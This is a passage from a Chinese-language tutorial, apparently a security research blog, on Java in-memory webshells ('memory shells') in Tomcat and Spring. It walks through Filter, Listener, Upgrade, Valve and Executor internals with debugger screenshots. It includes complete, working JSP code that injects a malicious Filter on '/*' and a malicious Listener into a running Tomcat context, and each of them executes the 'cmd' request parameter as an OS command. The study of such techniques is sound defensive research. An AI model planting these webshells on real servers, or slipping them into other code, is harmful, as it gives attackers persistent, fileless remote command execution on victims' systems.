![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217110558.png)
会从filters中依次拿到filter和filterConfig，最终调用`filter.doFilter()`:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217110841.png)



引用一张经典图片来描述filter的工作原理:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220216175207.png)



###### 1.1.3.内存马实现

```markdown
根据上面的调试，我们发现最关键的就是`StandardContext.findFilterMaps()`和`StandardContext.findFilterConfig()`，我们可以来看看这2个方法的实现，可以看到都是直接从StandardContext中取到对应的属性，那么我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现
```

动态添加filter的目的:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217112015.png)
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217112027.png)

实际上StandardContext也有一些方法可以帮助我们添加属性。首先我们来看filtermaps，StandardContext直接提供了对应的添加方法(Before是将filter放在首位，正是我们需要的)，这里再往filterMaps添加之前会有一个校验filtermap是否合法的操作，跟进`validateFilterMap()`:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217112920.png)
可以看到这里有一个坑点，它会根据filterName去寻找对应的filterDef，如果没找到的话会直接抛出异常，也就是说我们还需要往filterDefs里添加filterDef。
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217112417.png)

那么我们接下来再看filterDefs，StandardContext直接提供了对应的添加方法:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217112602.png)

最后我们再来看filterConfigs，根据命名规则搜索`addFilterConfig`，发现并没有这个方法，所以我们考虑要通过反射的方法手动获取属性并添加:
![img](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112715.png)
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217112750.png)

```markdown
我们先来了解一下在Tomcat中与Filter密切相关的几个类:
`1.FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息
`2.FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息
`3.FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern
`4.FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter
5.WebXml：存放 web.xml 中内容的类
6.ContextConfig：Web应用的上下文配置类
★7.StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper
★8.StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet

最后总结下Filter型内存马(即动态创建filter)的步骤:
1. 获取StandardContext
2. 继承并编写一个恶意filter
3. 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中
4. 实例化一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到StandardContext.filterMaps中(一般会放在首位)
5. 通过反射获取filterConfigs，实例化一个FilterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDefs，存放到filterConfig中
```

以下是代码的具体实现:

```
<!-- tomcat 8 -->
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    String name = "Longlone";
    // 获取StandardContext
    ServletContext servletContext = request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 获取filterConfigs
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null) {
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null) {
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder("cmd.exe", "/C", req.getParameter("cmd")).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes, 0, len));
                    process.destroy();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {

            }

        };

        // FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        // FilterMap
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);

        //ApplicationFilterConfig
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(name, filterConfig);

        out.print("Inject Success !");

    }
%>
```

###### X.注意事项

这种注入filter内存马的方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3

```
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
```

另外在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef

```
<!-- tomcat 7 -->
<%@ page import = "org.apache.catalina.deploy.FilterMap" %>
<%@ page import = "org.apache.catalina.deploy.FilterDef" %>
```

```
<!-- tomcat 8/9 -->
<%@ page import = "org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import = "org.apache.tomcat.util.descriptor.web.FilterDef"  %>
```

##### 1.2.Listener组件（监听器）

###### 1.2.0.编写一个Listener

```
//首先编写一个Listener并写入web.xml:
package top.longlone.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class DemoListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("request init");
    }
}
```

###### 1.2.1.Listener流程解析

然后我们在这个Listener的class部分和`requestInitialized()`下断点:
![image-20250604113231248](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604113231248.png)

```markdown
开启调试触发断点，根据堆栈回溯找到`StandardContext.listenerStart()`方法，这里要点进去搜一下就可以搜到了，可以看到它先调用`findApplicationListeners()`获取Listener的名字，然后实例化:
```

![image-20250604113344827](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604113344827.png)

```markdown
接着他会遍历results中的Listener，根据不同的类型放入不同的数组，我们这里的ServletRequestListener放入eventListeners数组中:
```

![image-20250604114213886](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604114213886.png)

```markdown
往下翻几行可以看到，通过调用`getApplicationEventListeners()`获取`applicationEventListenersList`中的值，然后再设置applicationEventListenersList，可以理解为applicationEventListenersList加上刚刚实例化的eventListeners。
```

![image-20250604114630931](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604114630931.png)
![image-20250604114910271](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604114910271.png)

```markdown
1.接下来调试器窗口按F9，看第二个断点，根据调用堆栈我们找到了fireRequestInitEvent()方法
```

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604115425373-9009271.png)

```markdown
1.往下翻几行看到调用了 listener.requestInitialized(event); 
2.而这个 listener 就是我们的恶意 Listener 实例，可以看到是通过遍历 instances 数组，`而 instances 数组就是通过 getApplicationEventListeners 方法来进行获取的值
X.看到这儿是不是很熟悉了～ 没错就是上面那个函数将实例添加进去的地方,我们的内存马只需要添加到这个数组里面就可以了
```

![image-20250604120348902](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604120348902.png)

![image-20250604121211102](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604121211102.png)

![image-20250604120845781](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604120845781.png)



###### 1.2.2.内存马实现

```markdown
根据上面的分析我们知道Listener来源于tomcat初始化时从web.xml实例化的Listener和applicationEventListenersList中的Listener，前者我们无法控制，但是后者我们可以控制，只需要往applicationEventListenersList中加入我们的恶意Listener即可。
实际上StandardContext存在`addApplicationEventListener()`方法可以直接给我们调用，往applicationEventListenersList中加入Listener。

所以我们的Listener内存马实现步骤:
1.继承并编写一个恶意Listener
2.获取StandardContext
3.调用`StandardContext.addApplicationEventListener()`添加恶意Listener
```

以下是代码的具体实现:

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>

<%
    class S implements ServletRequestListener{
        @Override
        public void requestDestroyed(ServletRequestEvent servletServletRequestListenerRequestEvent) {

        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");
            if(cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {}
            }
        }
    }
%>

<%
    ServletContext servletContext =  request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    S servletRequestListener = new S();
    standardContext.addApplicationEventListener(servletRequestListener);
    out.println("inject success");
%>
```

##### 1.3.Tomcat Upgrade 标准特性

###### 1.3.0.编写一个简单的 Tomcat Upgrade 的 demo

在之前的Tomcat Valve项目的基础上做了简单的修改，删除之前test目录下的TestValve.java，新建一个TestUpgrade.java：

```
package org.example.valvememoryshelldemo.test;

import org.apache.coyote.*;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import org.springframework.context.annotation.Configuration;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@Configuration
public class TestUpgrade implements UpgradeProtocol {
    @Override
    public String getHttpUpgradeName(boolean b) {
        return "hello";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, Request request) {
        return null;
    }

    public boolean accept(org.apache.coyote.Request request) {

        try {
            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
            response.setAccessible(true);
            Response resp = (Response) response.get(request);
            resp.doWrite(ByteBuffer.wrap("\n\nHello, this my test Upgrade!\n\n".getBytes()));
        } catch (Exception ignored) {}
        return false;
    }
}
```

然后修改TestConfig.java如下：

```
package org.example.valvememoryshelldemo.test;

import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.stereotype.Component;

@Component
public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

    @Override
    public void customize(TomcatServletWebServerFactory factory) {
        factory.addConnectorCustomizers(connector -> {
            connector.addUpgradeProtocol(new TestUpgrade());
        });
    }
}
```

```markdown
运行后访问，http://localhost:8081/成功出来请求
```

![image-20250605120637945](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605120637945.png)

![image-20250605120702825](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605120702825.png)





#### 2.Tomcat Valve 容器内部组件

##### 2.0. Valve 与 Pipeline

这里我组合引用原文，做了适当的修改，概括一下：

```markdown
tomcat中的Container有4种，分别是Engine、Host、Context和Wrapper，这4个Container的实现类分别是`StandardEngine`、`StandardHost`、`StandardContext`和`StandardWrapper`。4种容器的关系是包含关系，Engine包含Host，Host包含Context，Context包含Wrapper，Wrapper则代表最基础的一个Servlet。 tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。而Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的呢？

原来，当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件，跟pipeline相关的还有个也是容器内部的组件，叫做`valve`组件。

Pipeline的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，Pipeline和Valve关系也是一样的。Valve代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把Pipeline比作公路的话，那么Valve可以理解为公路上的收费站，车代表Pipeline中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。

在Catalina中，4种容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve，这个Valve我们称之为BaseValve，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。
```

```markdown
Pipeline定义对应的接口Pipeline，标准实现了StandardPipeline。Valve定义对应的接口Valve，抽象实现类ValveBase，4个容器对应基础阀门分别是StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。在实际运行中，Pipeline和Valve运行机制如下图：

这张图是新加坡的Dennis Jacob在ApacheCON Asia 2022上的演讲《Extending Valves in Tomcat》中的PPT中的图片，这篇演讲的录屏在[Youtube](https://www.youtube.com/watch?v=Jmw-d0kyZ_4)上面可以找到。
```

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240129171852854.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129171852854.png)

##### 2.1.编写一个简单 Tomcat Valve 的 demo

```markdown
1. 直接创建Spring的项目
2. 然后创建test目录并在test目录下创建两个文件，TestValve.java：

import java.io.IOException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;
import org.springframework.stereotype.Component;

@Component
public class TestValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException {
        response.setContentType("text/plain");
        response.setCharacterEncoding("UTF-8");
        response.getWriter().write("Valve 被成功调用");
    }
}

3. 还有TestConfig.java
import org.apache.catalina.Valve;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class TestConfig {
    @Bean
    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
        return factory -> {
            factory.addContextValves(getTestValve());
        };
    }

    @Bean
    public Valve getTestValve() {
        return new TestValve();
    }
}

```



![image-20250605101625424](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605101625424.png)

```markdown
运行后可以看到
```

![image-20250605105818275](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605105818275.png)

##### 2.2.Tomcat Valve 打入内存马思路分析

```markdown
我们通常情况下用的都是ValveBase，从com.example.tomcatvalvedemo.TomcatDemo.TestValve进这个ValveBase，可以看到是实现了Valve接口：
```

![image-20250605104636669](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605104636669.png)

点进valve可以看到该接口代码如下，这里我加上了注释：

```java
package org.apache.catalina;

import java.io.IOException;
import javax.servlet.ServletException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public interface Valve {
    // 获取下一个阀门
    public Valve getNext();
    // 设置下一个阀门
    public void setNext(Valve valve);
    // 后台执行逻辑，主要在类加载上下文中使用到
    public void backgroundProcess();
    // 执行业务逻辑
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
    // 是否异步执行
    public boolean isAsyncSupported();
}
```

接下来就是调试看看这个valve的运行流程了，我们在invoke函数这里下断点调试：

![image-20250605111012447](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605111012447.png)

```markdown
我们看向左下角，看看之前调用到的invoke方法，在StandardHostValve.java中，代码为：
context.getPipeline().getFirst().invoke(request, response);
```

![image-20250605111059756](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605111059756.png)

```markdown
在StandardEngineValve.java中，代码为：
host.getPipeline().getFirst().invoke(request, response);
```

![image-20250605111204873](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605111204873.png)

既然我们的目的是打入内存马，那==根据我们掌握的Tomcat Servlet/Filter/Listener内存马的思路来看，我们需要通过某种方式添加我们自己的恶意valve。==

```markdown
我们去掉之前打的断点，在StandardHostValve.java这里打上断电并重新调试：
```

![image-20250605112548897](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605112548897.png)

```markdown
然后step into，鼠标左键选择这里的getPipeline()方法，即可进入到所调用的函数实现的位置：
```

![image-20250605112959159](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605112959159.png)

```markdown
再Ctrl+H进入Pipeline接口，可以看到是有个addValve方法，
```

![image-20250605113305363](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605113305363.png)

![](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605113708401.png)

```markdown
这不正是我们需要的吗？看看它是在哪儿实现的，直接在addValve函数处Ctrl+shift+H找继承该接口的类，可可以看到是在org.apache.catalina.core.StandardPipeline中：
```

![image-20250605114927080](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605114927080.png)

```markdown
但是问题就来了，我们无法直接获取到这个StandardPipeline类，而我们能直接获取到的是StandardContext，那就去看看StandardContext.java中有没有获取StandardPipeline的方法，一眼就能看到我们的老熟人——getPipeline方法：

1. 那这样以来我们的思路就可以补充完整了，先反射获取StandardContext
2. 然后编写一个恶意Valve
3. 最后通过StandardContext.getPipeline().addValve()添加就可以了。
X. 我们也可以反射获取StandardPipeline，然后再addValve，这样也是可以的。
```

![image-20250605115255049](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605115255049.png)

### 2.1.2.Tomcat Executor 线程池

#### 1.编写一个简单的Tomcat Executor的demo

新建一个项目，配置好tomcat运行环境和web目录，然后新建以下两个文件，第一个是TestExecutor.java：

```
import java.io.IOException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class TestExecutor extends ThreadPoolExecutor {

    public TestExecutor() {
        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
    }

    @Override
    public void execute(Runnable command) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        super.execute(command);
    }
}
```

第二个是TestServlet.java：

```
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
    }
}
```

然后访问浏览器对应context下的test路由：

![image-20250605161458409](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605161458409-9111299.png)

#### 2.Executor 相关代码分析

点开Executor.java即可看到有一个execute方法，`Ctrl+Alt+F7`追踪即可看到这个Executor接口在AbstractEndpoint这个抽象类中有相关实现：

![image-20250605162048495](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605162048495-9111649.png)

在AbstractEndpoint.java中搜索executor，往下翻即可看到有setExecutor和getExecutor这两个函数：

![image-20250605163413665](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605163413665.png)

查看getExecutor函数的调用位置，发现就在该文件中有一个关键调用：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240202145839900-20250620171657074.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145839900.png)

跟过去：

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240202145913789-20250620171820125.png)

```markdown
从下面这篇[文章](https://blog.51cto.com/u_8958931/2817418)中我们可以知道processSocket在Tomcat运行过程中的作用：
那此时我们就有一个想法，如果我能控制executor，我把原来的executor通过setExecutor变成我恶意创建的executor，然后再通过这后面的`executor.execute`（`org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)`）一执行就可以加载我们的恶意逻辑了。

但是现在有一个很头疼的问题，那就是标准的ServletRequest需要经过Adapter的封装后才可获得，这里还在Endpoint阶段，其后面封装的ServletRequest和ServletResponse无法直接获取。
```

那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触`java-object-researcher`的时候，c0ny1师傅写的这篇[文章：](http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240202165813229-20250620171902789.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165813229.png)

![image-20250620172606376](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620172606376.png)

```markdown
那就试试看呗，我们导入jar包到项目
1. 先把jar包编译出来
2. 把java-object-searcher.jar放入
/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home/jre/lib/ext中，目前只有这种办法使用其他办法时发现依赖出问题用不了
```

![image-20250605195651068](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605195651068.png)

为了输出修改TestServlet.java代码如下：

```
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("request").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
    }
}
```

接着访问路由/test，然后在控制台输出中搜索`request =`：

![image-20250620172804029](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620172804029.png)

直接搜索到了这条链：

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>} 
        ---> [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
         ---> socket = {org.apache.tomcat.util.net.NioChannel} 
          ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
            ---> request = {org.apache.coyote.Request}
```

![image-20250605200534585](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605200534585.png)

我们来验证一下，在`org/apache/tomcat/util/net/NioEndpoint.java`的这里下断点，不断step over，就可以找到这里的request的位置：

![image-20250605201714398](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605201714398.png)

```markdown
点开这里的byteBuffer-hb，可以看到它是一个字节数组，右键找到`View as ... String`即可变成字符串，再点击上面我指出来的View Text即可清楚看到具体内容：
这就意味着我们可以把命令作为header的一部分传入，再把结果作为header的一部分传出即可。
```

![image-20250605201945618](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605201945618.png)

![image-20250605202008509](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250605202008509.png)

## 2.2.Spring Web 技术栈

### 2.2.0.通用Web框架组件

### 2.2.1. SpringBoot 底层平台

```markdown
Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。

`可以看到SpringBoot主要目的是为了简化Spring应用的搭建与开发。
```

```markdown
1.按照如图所示配置，设置Server URL为https://start.aliyun.com/,这里选用java8，Maven进行依赖管理。
2.选择需要的依赖，这里选择Spring Web，SpringBoot版本选择默认的2.6.13
```

![image-20250604134427595](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604134427595.png)

![image-20250604134846015](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604134846015.png)

```markdown
如下图所示，Spring Boot的基础结构共三个文件夹(具体路径根据用户生成项目时填写的Group和ArtiFact有所差异）:
1. src/main/java下的程序入口：SpringDemoApplication
2. src/main/resources下的配置文件：application.properties
3. src/test/下的测试入口：SpringDemoApplicationTests
```

![image-20250604135404279](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250604135404279.png)

### 2.2.2.Spring MVC框架

#### 1.Spring MVC的核心组件和大致处理流程

```markdown
1. DispatcherServlet是前端控制器，它负责接收Request并将Request转发给对应的处理组件；
2. HandlerMapping负责完成url到Controller映射，可以通过它来找到对应的处理Request的Controller；
3. Controller处理Request，并返回ModelAndVIew对象，ModelAndView是封装结果视图的组件；
④~⑦表示视图解析器解析ModelAndView对象并返回对应的视图给客户端。
```

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/springmvc2-9026352.png)

#### 2.IOC容器

```markdown
IOC（控制反转）容器是Spring框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。IOC容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。Spring框架提供了多种实现IOC容器的方式，下面讲两种常见的：

BeanFactory：Spring的最基本的IOC容器，提供了基本的IOC功能，只有在第一次请求时才创建对象。
